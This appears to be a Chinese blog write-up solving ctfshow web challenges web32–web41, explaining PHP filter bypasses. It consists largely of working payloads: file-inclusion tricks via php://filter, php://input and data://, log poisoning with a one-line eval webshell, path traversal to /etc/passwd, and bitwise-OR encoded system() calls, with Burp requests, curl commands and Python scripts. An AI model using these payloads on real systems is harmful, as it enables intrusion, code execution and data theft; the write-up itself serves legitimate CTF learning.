| **php://filter + base64 读源码**                 | 放进参数 `1` 而不是 `c`                   | web29 用过伪协议，这次因为 c 里不能有 php，必须转移 |
| **日志注入 + 蚁剑**                              | `&1=../../../../var/log/nginx/access.log` | 换个入口                                            |
| 相对路径穿越                                     | `../../../../etc/passwd`                  | 文件包含通用技巧                                    |

我们这时候就需要**语言构造**了

#### 语言构造

PHP 里有一类东西**不是函数**，所以**不需要括号**：

```
include "文件";        // 语言构造
include_once "文件";
require "文件";        // 出错会终止
require_once "文件";
print 123;             // 也是语言构造
die;                   // 直接退出
```

`include` 是本题的入口——它会把指定文件**当成 PHP 代码加载执行**（不只是读内容，后面可以使用这个一把梭）。

#### 原理

##### 1.为什么 `include$_GET[1]` 不用括号？

因为 `include` 是**语言构造(language construct)**，不是函数。PHP 解析器把它当关键字处理，后面直接跟表达式即可：

```
include $_GET[1];     // 正常写法(空格被过滤，但…)
include$_GET[1];      // 紧挨着也能解析
```

而 `passthru` 是**函数**，必须 `passthru(...)`，括号一封就死。

> 语言构造还有：`echo`、`print`、`die`/`exit`、`isset`、`empty`、`unset`、`list`、`array`、`include`/`require` 系列。注意 `isset()`/`empty()` 还是要括号的语法形式。

##### 2.为什么 `?>` 能代替分号？

PHP 有个语法规则：**`?>` 关闭标签时，PHP 会自动把它当成分号的结束**。所以：

```
include $_GET[1]?>     // 合法！?> 自带"语句结束"效果
```

分号被封，`?>` 就成了语句结束符。这也是为什么所有 payload 都以 `?>` 收尾。

##### 3.为什么 `%0a` 能用？

`%0a` 是**换行符(Line Feed)**，PHP 把它当普通空白字符。过滤只挡了字面空格` `，换行/制表符都没挡。所以 `include%0a$_GET[1]` 就是 `include\n$_GET[1]`，合法。

#### 四条解法

##### 法 1：php://filter + base64(最经典)

```
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

拆解：

- `c=include$_GET[1]?>` → 包含"参数 1 指定的资源"
- `&1=php://filter/convert.base64-encode/resource=flag.php` → 参数 1 是 php 伪协议：**读 flag.php 的源码并 base64 编码输出**
- 结果是一大串 base64，拿去 CyberChef(或 Git Bash `base64 -d`)解码

要 flag 完整内容：`... | base64 -d | grep -o "ctfshow{[^}]*}"`

##### 法 2：php://input + POST(最好玩，直接变成 RCE)

```
URL:  ?c=include$_GET[1]?>&1=php://input
POST body: <?php system("tac flag.php")?>
```

原理：`php://input` 代表"请求体"。include 它 = 把请求体当成 PHP 代码**执行**。请求体里的 `system(...)`、`;` 都不受过滤影响（过滤只查 `c` 参数）。

> 这就是**文件包含 → 远程代码执行**的标准链条：`include` 不只读文件，它**执行**文件里的 PHP 代码。

##### 法 3：data:// 伪协议(最短)

```
?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
```

把 PHP 代码直接放在 URL 里当"文件"包含。前提是 `allow_url_include=On`。不用 POST，一条 GET 就出 flag。

###### Q1:什么是`allow_url_include=On`?

> `allow_url_include` 是 PHP 配置文件（php.ini）里的一个开关：
>
> - **allow**：允许
> - **url**：网址、远程链接
> - **include**：包含（就是前面讲的 include 那个文件包含语句）
> - **=On**：开启
>
> 合起来意思是：**“允许 include 去包含 URL 形式（远程 / 伪协议）的资源”**。

###### Q2：这个开关管什么？

> PHP 的 include 有两种用法，受这个开关控制：
>
> 1. **包含本地文件**（比如 `include 'flag.php'`）
> 	不管开关是开是关，都能用
> 2. **包含 URL 形式的资源**，比如：
> 	- `data://text/plain,代码`
> 	- `http://别的网站/shell.txt`
> 	- `php://input`
> 		只有 **allow_url_include = On** 时，include 才肯加载这些；如果是 **Off（默认值，PHP 5.2 之后默认关闭）**，include 直接报错拒绝，payload 就失败

###### 为什么这条 data://payload要用？

> ```
> ?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
> ```
>
> `data://` 的意思是：**“文件内容直接写在 URL 里”**，服务器上根本不存在这个文件，include 要把 data:// 后面的文字当成一个 “远程文件” 读进来并执行里面的 PHP 代码。这在 PHP 看来属于 “包含 URL”，所以必须开这个开关。

###### 区分：

> - `data://`、`http://`、`php://input` → **需要** allow_url_include=On
> - `php://filter`（之前那个 base64 读源码的伪协议）→ **不需要**，它属于本地文件操作类包装器，开关关着也能用

###### 怎么确认目标开没开？

> - 看目标的 `phpinfo()` 页面，搜索 allow_url_include，会显示 On 或 Off
> - 这个配置是服务器管理员设的，攻击者一般改不了，所以教程说它是 “前提”

##### 法 4：日志注入(不知道 flag 文件名时用)

```
?c=include$_GET[1]?>&1=../../../../var/log/nginx/access.log
```

- nginx 会把每个请求的 **User-Agent 写进 access.log**
- 先把 UA 改成一个一句话木马：`<?php eval($_POST[1]);?>`（用 Burp 改包或浏览器插件）
- 再 include 这个日志文件 → 日志里的木马被执行
- 然后用蚁剑连（或者直接再 POST 命令）

**这是不知道 flag 在哪时的通用打法**：只要能读日志，就能养马。

### web33

![image-20261106194230887](/assets/ctfshow-web-command-exec/image-20261106194230887.png)

和 web32 的就一个字符差别

新增过滤：**双引号 `"`**

```
"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"
```

#### 重复的方法

| 方法                         | 在 web33的写法                                               |
| :--------------------------- | :----------------------------------------------------------- |
| `include` + 参数转移         | `?c=include$_GET[1]?>&1=...`                                 |
| php://filter + base64 读源码 | `&1=php://filter/read=convert.base64-encode/resource=flag.php` |
| php://input + POST 执行代码  | `&1=php://input` + body `<?php system("tac flag.php")?>`     |
| data:// 伪协议               | `&1=data://text/plain,<?php system("tac flag.php")?>`        |
| 相对路径穿越                 | `&1=../../../../etc/passwd`                                  |
| 日志注入 + 蚁剑              | 同上，`&1=.../access.log`                                    |

#### 推荐的payload

##### 1.读源码 base64

```
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

拿到 base64 后：Git Bash 里 `base64 -d`,或 CyberChef 解码。

##### 2.一次性拿flag

```
URL: ?c=include$_GET[1]?>&1=php://input
POST body: <?php system("tac flag.php")?>
```

##### 3.使用 **GET** 

```
?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
```

这个依赖 `allow_url_include=On`，这个开着才能使用

### web34

**和 web33 相比，只多过滤了一个冒号 `:`**

```
"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"
```

- `\:` 是字面冒号（冒号在正则里本身不是特殊字符，这里的反斜杠只是写法统一）
- 冒号是 `php://`、`data://`、`http://` 这些伪协议的"协议分隔符"

#### Q1：封冒号说明了什么？

> 封了冒号，等于说：**c 参数里不能直接写伪协议**。如果前面几题是把 `php://filter...` 直接塞进 `c` 的，这里就会失效；但前面讲的"参数转移"，把协议放进第二个参数还是能够使用的。

#### 重复的方法

| 方法 | 在 web34 的写法 | 说明 |
| :--- | :--- | :--- |
| 参数转移 | `?c=include$_GET[1]?>&1=...` | c 里没有冒号，天然安全 |
| php://filter + base64 | `&1=php://filter/read=convert.base64-encode/resource=flag.php` | 冒号在参数 1 里 |
| data:// | `&1=data://text/plain,<?php system("tac flag.php")?>` | 同上 |
| php://input | `&1=php://input`，POST body 执行代码 | 同上 |
| 相对路径穿越 | `&1=../../../../etc/passwd` | 同上 |
| 日志注入 + 蚁剑 | `&1=../../../../var/log/nginx/access.log` | 同上 |

**结论：web34 没有新方法，web32/33 的 payload 原样可用。**

#### 唯一失效的写法

把协议直接写在 c 里：

```
?c=include:$_GET[1]?>    ← c 里出现冒号 → 空回显
```

#### 推荐 payload

```
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

### web35

**新增过滤：`<` 和 `=`**

```
"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i"
```

- `\<` 小于号：`c` 里不能再写 `<?php`、`<?=` 这类 PHP 开标签
- `\=` 等号：`c` 里不能再写赋值 `$a=$b`

#### 重复的方法

| 方法 | 在 web35 的写法 | 说明 |
| :--- | :--- | :--- |
| 参数转移 | `?c=include$_GET[1]?>&1=...` | c 里没有 `<`、`=` |
| php://filter + base64 | `&1=php://filter/read=convert.base64-encode/resource=flag.php` | 协议和路径都在参数 1 |
| data:// 明文 | `&1=data://text/plain,<?php system("tac flag.php")?>` | `<?php` 在参数 1，不受过滤 |
| php://input | `&1=php://input`，POST body 执行代码 | `<`、`=` 都在 body 里 |
| 相对路径穿越 | `&1=../../../../etc/passwd` | — |
| 日志注入 + 蚁剑 | `&1=../../../../var/log/nginx/access.log` | — |

#### 新方法：data:// 的 base64 形式

```
?c=include$_GET[1]?>&1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+
```

- `;base64,` 表示后面的内容先 base64 解码，再当作文件内容
- `PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+` 解码 = `<?php system("tac flag.php")?>`
- 好处：URL 里完全不出现 `<`、`=`、空格、引号这些敏感字符
- 自己生成：`printf '%s' '<?php system("tac flag.php")?>' | base64 -w0`

#### 推荐 payload

```
?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
?c=include$_GET[1]?>&1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

### web36

**新增过滤：`/` 和 `[0-9]`**

```
"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i"
```

- `\/`：斜杠（路径分隔符）
- `[0-9]`：**所有数字**

参数名不能使用数字了

前面几题的骨架都是 `include$_GET[1]?>`，这里的 `1` 是数字，会被 `[0-9]` 拦下，整个 payload 失效。

那就**把参数名换成字母**呗。

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

- `$_GET[a]` 里的 `a` 不加引号，PHP 会当字符串 `"a"` 处理
- c 里一个没有数字，顺利通过过滤

#### Q1：斜杠被封为什么没影响？

> 因为路径（`php://filter/.../resource=flag.php`）全部放在**参数 a** 里，而**过滤只检查 c**。

#### 重复的方法（改个参数名即可）

| 方法 | 在 web36 的写法 |
| :--- | :--- |
| 参数转移 | `?c=include$_GET[a]?>&a=...` |
| php://filter + base64 | `&a=php://filter/read=convert.base64-encode/resource=flag.php` |
| data:// | `&a=data://text/plain,<?php system("tac flag.php")?>` |
| data:// base64 | `&a=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+` |

### web37

**这题代码结构变了**

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    }
}else{
    highlight_file(__FILE__);
}
```

- 过滤只剩 `/flag/i`（比前面松多了）
- 但多了 `echo $flag;`
- 注释写明：`//flag in flag.php`

#### 法 1：data:// 直接执行命令

```
?c=data://text/plain,<?php system('tac fl*');?>
```

- web37 只挡 flag，**单引号没有被挡**
- `fl*` 用通配符绕开 flag

#### 法 2：php://input（要 POST）

```
URL: ?c=php://input
POST body: <?php system('tac fl*');?>
```

#### 法 3：data:// + base64

```
?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSgnZmxhZy5waHAnKTtlY2hvICRmbGFnOz8+
```

这串 base64 解码是：

```php
<?php include('flag.php');echo $flag;?>
```

为什么能过过滤：提交的 `c` 里只有 `PD9waHAg...` 这些 base64 字符，**"flag" 三个字母是编码后的**，过滤器看不见；等 data 协议解码执行时才还原，正好走完 `include` + `echo $flag` 的流程。

### web38

**这题封了 `php` 和 `file`**

```php
if(!preg_match("/flag|php|file/i", $c)){
    include($c);
    echo $flag;
}
```

- 过滤：`flag`、`php`、`file` 三个词
- 代码还是 `include($c); echo $flag;`

#### PS：这题有点狠

- `php` 被封 → **`<?php` 开标签写不了**，**`php://` 伪协议也用不了**
- `file` 被封 → 额外堵掉了 `file://`；`php://filter` 失效是因为它含 `php`，`filter` 里并没有 `file`
- 前面的 `php://filter`、`php://input`、`<?php`，到这里都用不了

#### 新方法 1：使用`<?=` 短标签

`<?=` 是 PHP 的「短 echo 标签」，等价于 `<?php echo`，但它**不含 "php" 这三个字母**：

```
?c=data://text/plain,<?=system('tac fl*')?>
```

- `<?=` 从 PHP 5.4 起恒可用，不受 `short_open_tag` 配置影响
- `system` 这题没被封（只封了 flag/php/file）
- `fl*` 继续用通配符绕 flag

#### 新方法 2：base64 把关键字全藏起来

```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7Pz4=
```

- 解码 = `<?php system('tac fl*');?>`
- 提交的 c 里只有 base64 字符，`php`、`flag` 都在编码之后，过滤器看不见
- 生成：`printf '%s' "<?php system('tac fl*');?>" | base64 -w0`

### web39

**偷偷加了个 `.php`**

```php
if(!preg_match("/flag/i", $c)){
    include($c.".php");
}
```

- 过滤只有 `flag`
- 但代码是 `include($c.".php")`：你传什么，后面都会**自动补 `.php`**

#### 使用的payload

```
?c=data://text/plain,<?php system('tac fl*')?>
```

实际执行：

```php
include("data://text/plain,<?php system('tac fl*')?>.php");
```

data 协议的内容 = `<?php system('tac fl*')?>` + `.php`。多出来的 `.php` **落在 `?>` 之后**，是 PHP 标签外的普通文字，只会被原样输出。

#### Q1：为什么不能使用base64 和 php://input ？

> | payload                                 | 实际变成          | 结果                                    |
> | :-------------------------------------- | :---------------- | :-------------------------------------- |
> | `data://text/plain;base64,PD9wa...Pz4=` | `...Pz4=.php`     | 失败：`.php` 塞进 base64 串，解码被破坏 |
> | `php://input`                           | `php://input.php` | 失败：包装器路径非法                    |
> | `data://text/plain,<?php ...?>`         | `...?>.php`       | 成功：后缀是标签外文字，无害            |

**需要判断的地方**：看到"自动补后缀"的代码，要想一下补上的后缀会不会破坏payload

### web40

![image-20261106210423382](/assets/ctfshow-web-command-exec/image-20261106210423382.png)

**过滤里藏了个坑：括号是全角的**

```php
if(!preg_match("/[0-9]|\~|\`|\@|\#|\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\/i", $c)){
    eval($c);
}
```

被封的东西：

- 所有数字
- `~` `` ` `` `@` `#` `$` `%` `^` `&` `*`
- `-` `=` `+` `{` `[` `]` `}` `:` `'` `"` `,` `<` `.` `>` `/` `?` `\`
- **注意：写的是全角 `（` `）`，半角 `( )` 没有被封**

因为数字、`$`、`[`、`]` 都被封了，**不能用变量、不能用参数**，这就是“无参数”的由来。但半角括号、分号 `;`、下划线 `_` 还在，所以函数还能调用，只是不能传变量。

#### Q1：什么是全角，什么是半角？

> **全角和半角是两套“长得像、但编码完全不同”的字符，区别主要在宽度。**
>
> - **半角（half-width）**：窄，占一个字符宽度，比如 `( )`
> - **全角（full-width）**：宽，占两个字符宽度（和一个汉字一样宽），比如 `（ ）`

#### Q2：为什么会有这两种？

> - 最早的电脑只处理英文，一个字母 / 符号占一个格子，这就是半角，比如 `( ) , ; : ?`
> - 后来要处理中文、日文这些“方块字”，一个汉字宽度正好等于两个英文字母，于是就有了全角字符；连标点也做了一套全角版本，和汉字排版对齐
> - 它们虽然看起来像，但在计算机里是**完全不同的字符、不同的编码**，程序不会把它们当成同一个东西
>
> **给你对照着看看**
>
> | 半角    | 全角      |
> | :------ | :-------- |
> | `(` `)` | `（` `）` |
> | `;`     | `；`      |
> | `,`     | `，`      |
> | `:`     | `：`      |
> | `?`     | `？`      |
> | `ABC`   | `ＡＢＣ`  |
>
> **全角更胖、和汉字一样宽；半角更窄、只有一半宽。**

**回到这题看**

过滤正则里写的是全角 `（` `）`，意思是它只拦全角括号；而写 PHP 代码、调用函数真正需要的是**半角 `( )`**，正则里根本没写这个字符，所以半角括号没被封，照样能用。作者用了一个“看起来一样、实际不同”的字符来做过滤。

#### Q3：怎么打出来？

> - 中文输入法处于“中文标点”状态时，按括号键出来的就是全角 `（ ）`
> - 切成英文标点（或直接用英文输入法），出来的就是半角 `( )`
> - 很多输入法里 `Shift + 空格` 可以切换全角 / 半角模式
>
> **写代码时要注意的地方：**
>
> PHP、命令行里的代码符号必须用半角：`( ) ; ' "` 这些。全角符号在代码里只会被当成普通文字，直接语法报错。全角标点只会用在中文文章里。

#### 解法：使用无参数函数链

先侦察：

```
?c=print_r(scandir(getcwd()));
```

输出：

![image-20261106205347458](/assets/ctfshow-web-command-exec/image-20261106205347458.png)

```
Array
(
    [0] => .
    [1] => ..
    [2] => flag.php
    [3] => index.php
)
```

读文件：

```
?c=show_source(next(array_reverse(scandir(getcwd()))));
```

从里往外看：

| 步骤 | 结果 |
| :--- | :--- |
| `scandir(getcwd())` | `['.', '..', 'flag.php', 'index.php']` |
| `array_reverse(...)` | `['index.php', 'flag.php', '..', '.']` |
| `next(...)` | 指针从第 1 个后移到第 2 个 → `flag.php` |
| `show_source(...)` | 输出它的源码 |

没有变量、没有数字、没有引号，都是些不带参数的函数。

![image-20261106205434915](/assets/ctfshow-web-command-exec/image-20261106205434915.png)

#### 其他等价写法

```
?c=highlight_file(next(array_reverse(scandir(getcwd()))));
?c=readfile(next(array_reverse(scandir(getcwd()))));
?c=show_source(array_rand(array_flip(scandir(getcwd()))));
```

最后一条的命令是随机挑一个文件，多刷新几次也能出 flag。

**注意：**

`phpinfo()` 这题**没有被挡**（“php” 不在名单里），可以用来看环境。它输出的是 `<!DOCTYPE html ...>` 开头的 HTML。

### web41

![image-20261106210405923](/assets/ctfshow-web-command-exec/image-20261106210405923.png)

**字母数字全封，而且是 POST**

```php
if(isset($_POST['c'])){
    $c = $_POST['c'];
    if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}
```

- **这题用 POST**（前面都是 GET），参数名仍是 `c`
- 封了：数字、字母（不区分大小写）、`^` `+` `~` `$` `[` `]` `{` `}` `&` `-`
- 还能用：`( ) ; ' " | . , < > / ? : % * = _` 和空白

前面常用的 `~` 取反法在这里被封了，只能换**位或 `|`**。

#### 原理：用两个字节“或”出字符

PHP 支持两个字符串按位或：

```php
'%13' | '%60'   →   0x13 | 0x60 = 0x73 = 's'
```

比较关键的地方：POST body 里的 `%13` 被服务器 URL 解码成**原始字节 0x13**，它不是数字也不是字母，**能过过滤**；`|` 本身也没被封。用 `.` 把字符拼起来，就能拼出函数名和参数。

PHP 7 以上支持“字符串直接当函数调用”，所以用：

```php
(函数名字符串)(参数字符串)
```

就能执行命令。

#### payload

先看目录（相当于 `system("ls")`）：

```
c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))
```

读 flag（相当于 `system("cat fl*")`）：

```
c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%03'|'%60').('%01'|'%60').('%14'|'%60').(' '|' ').('%06'|'%60').('%0c'|'%60').('%0a'|' '))
```

#### 字符对照

> | 字符 | 十六进制 | 构造           |
> | :--- | :------- | :------------- |
> | s    | 0x73     | `0x13 \| 0x60` |
> | y    | 0x79     | `0x19 \| 0x60` |
> | t    | 0x74     | `0x14 \| 0x60` |
> | e    | 0x65     | `0x05 \| 0x60` |
> | m    | 0x6d     | `0x0d \| 0x60` |
> | l    | 0x6c     | `0x0c \| 0x60` |
> | c    | 0x63     | `0x03 \| 0x60` |
> | a    | 0x61     | `0x01 \| 0x60` |
> | f    | 0x66     | `0x06 \| 0x60` |
> | 空格 | 0x20     | `' '\|' '`     |
> | `*`  | 0x2a     | `0x0a \| 0x20` |

#### 或者你想自己生成？

```python
blocked = set("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ^+~$[]{}&-")

def fmt(x):
    c = chr(x)
    if 32 <= x < 127 and c not in blocked and c not in "'\%":
        return c
    return "%%%02x" % x

def enc(s):
    parts = []
    for ch in s:
        t = ord(ch)
        for a in range(1, 127):
            for b in range(1, 127):
                if a | b == t:
                    parts.append("('%s'|'%s')" % (fmt(a), fmt(b)))
                    break
            else:
                continue
            break
        else:
            raise ValueError(ch)
    return ".".join(parts)

print("c=(%s)(%s)" % (enc("system"), enc("cat fl*")))
```

（脚本可能把可打印字节直接写出来，效果和 `%XX` 写法一样。）

#### 法1：用Burp

##### 第 0 步：先看清抓到的原始请求（它是 GET）

浏览器打开靶机后，Burp 里抓到的是这样一条**纯 GET** 请求：

![image-20261106213552609](/assets/ctfshow-web-command-exec/image-20261106213552609.png)

注意：这条请求里**没有 `Content-Length`**，也没有请求体——GET 本来就不带 body，服务器的参数是从 URL 的 `?c=...` 里读的。而 web41 要的是 `$_POST['c']`，所以要进行修改。

##### 第 1 步：把请求送到 Repeater

1.空白处**右键** → **Send to Repeater（发送到重放器）**

2.点顶部的 **Repeater（重放器）** 标签

![image-20261106213709226](/assets/ctfshow-web-command-exec/image-20261106213709226.png)

```
GET / HTTP/1.1
Host: 176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://ctf.show/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
Connection: close


```

##### 第 2 步：要改的3 个地方

| 改哪里 | 原来的样子 | 改成 |
| :--- | :--- | :--- |
| **请求行** | `GET / HTTP/1.1` | `POST / HTTP/1.1` |
| **请求头** | 没有 `Content-Length` | 加一行 `Content-Length: 116`（数字是 body 的字节数） |
| **空行 + body** | 头结束就没了 | 头后面**空一行**，再写 `c=...` |

##### Q1：为什么要加 `Content-Length`？

> HTTP 里 POST 如果没有 `Content-Length`（也没有 `Transfer-Encoding`），服务器会认为“这个请求没有请求体”，写在下面的 `c=...` 会被直接忽略。PHP 里 `$_POST['c']` 就是空的，`isset($_POST['c'])` 为假，于是走了 `else` 分支——页面回显的是题目源码（`highlight_file`），看起来就像“没反应”。

##### Q2：为什么必须有空行？

> 请求头和请求体之间要用一个空行分隔。没有空行时，`c=...` 会被当成一个请求头，而不是 body。

##### 第 3 步：改完后的完整请求（读目录）

先看目录（相当于 `system("ls")`，参数c是：

```
c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))
```

下面的可以直接复制粘贴，不过要注意修改你的网址

```
POST / HTTP/1.1
Host: 176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close

c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))
```

换 body 后 `Content-Length` 要跟着变，否则还是会读不到。可以打开 Repeater 的 **Update Content-Length** 让它自动算，或者自己数一遍字节数。

这里能开：

![image-20261106214422994](/assets/ctfshow-web-command-exec/image-20261106214422994.png)

##### 第 4 步：发送，看响应

点左上角 **Send（发送）**，右边就是 Response。

![image-20261106215036260](/assets/ctfshow-web-command-exec/image-20261106215036260.png)

| 响应 | 说明 |
| :--- | :--- |
| `flag.php` `index.php` | 成功，`ls` 执行了 |
| 一大段 `<code><span ...><?php` | **失败**：`$_POST['c']` 没收到，回第 2 步检查三处 |
| 单个字符 `s` | 说明发的是最短测试 payload，正常 |
| `Call to undefined function xxx` | 函数名拼错了 |

##### 第5步：换成读 flag 的payload

参数c换成，读flag（相当于 `system("cat fl*")`）：

```
c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%03'|'%60').('%01'|'%60').('%14'|'%60').(' '|' ').('%06'|'%60').('%0c'|'%60').('%0a'|' '))
```

下面的可以直接复制粘贴，不过你的网址记得换

```
POST / HTTP/1.1
Host: 176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Length: 180

c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%03'|'%60').('%01'|'%60').('%14'|'%60').(' '|' ').('%06'|'%60').('%0c'|'%60').('%0a'|' '))
```

![image-20261106215456406](/assets/ctfshow-web-command-exec/image-20261106215456406.png)

#### 法2：用 curl（Git Bash，一条命令）

先测最短的：

```bash
curl -sk -X POST "https://176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show/" \
  --data "c=('%13'|'%60')"
```

![image-20261106220832708](/assets/ctfshow-web-command-exec/image-20261106220832708.png)

读目录：

```bash
curl -sk -X POST "https://176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show/" \
  --data "c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))"
```

![image-20261106220927526](/assets/ctfshow-web-command-exec/image-20261106220927526.png)

读 flag：

```bash
curl -sk -X POST "https://176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show/" \
  --data "c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%03'|'%60').('%01'|'%60').('%14'|'%60').(' '|' ').('%06'|'%60').('%0c'|'%60').('%0a'|' '))"
```

![image-20261106221006032](/assets/ctfshow-web-command-exec/image-20261106221006032.png)

- `-X POST`：强制用 POST
- `--data`：把后面整串当 body 发出去，**不会**再编码，`%13` 原样保留（正好是这题要的）
- `--data` 会自动带上 `Content-Type: application/x-www-form-urlencoded` 并算好 `Content-Length`，不用自己写
- `-k`：跳过 HTTPS 证书校验（本机 curl 有时会因证书吊销检查报错）
- `-s`：安静模式，只输出响应

#### 法3：用 Python（requests）

```python
import requests

url = "https://75f6f1f5-65ee-4706-89c6-8327d0762366.challenge.ctf.show/"
payload = "c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))"

r = requests.post(
    url,
    data=payload,
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    verify=False,
)
print(r.text)
```

**注意**：`data` 要直接给**字符串**。如果写成 `data={"c": payload}`，requests 会对值再做一次 URL 编码，`%13` 变成 `%2513`，payload 就废了。

#### Q3：为什么不能直接用浏览器地址栏？

> 地址栏只能发 **GET**，参数会拼在 URL 的 `?` 后面；而 web41 读的是 `$_POST['c']`，GET 传不进去。想在浏览器里发 POST，只能在页面里写一个 `<form method="post">` 来提交——比用 Burp/HackBar 麻烦，不推荐。

::link-banner
---
banner: /assets/西施，冰雪.jpg
title: 下一篇
description: ctfshow-WEB入门（命令执行）第二篇
link: "https://blog.qianbenyuan.dpdns.org/2026/ctfshow-web-command-exec-2"
---
::
